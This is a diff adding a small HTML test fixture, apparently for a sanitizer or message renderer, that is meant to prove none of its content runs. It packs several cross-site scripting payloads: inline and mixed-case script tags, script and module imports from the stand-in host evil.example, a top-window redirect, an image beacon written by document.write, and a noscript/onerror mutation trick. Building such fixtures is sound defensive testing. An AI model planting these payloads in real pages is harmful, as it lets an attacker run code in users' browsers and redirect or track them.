@@ -1,0 +1,12 @@
+<html><head><title>Script tags</title>
+<script>parent.__pwned = "head-script";</script>
+<SCRIPT SRC="https://evil.example/head.js"></SCRIPT>
+</head><body>
+<p>Hostile fixture 01: script tags. Nothing in this message may run.</p>
+<script>parent.__pwned = "body-script"; document.write("<img src='https://evil.example/written.gif'>");</script>
+<script type="module">import "https://evil.example/m.js";</script>
+<sCrIpT>top.location = "https://evil.example/escaped";</sCrIpT>
+<noscript><p title="</noscript><img src=x onerror=parent.__pwned='noscript'>"></p></noscript>
+<template><script>parent.__pwned = "template";</script></template>
+<div>&lt;script&gt;this text is fine&lt;/script&gt;</div>
+</body></html>
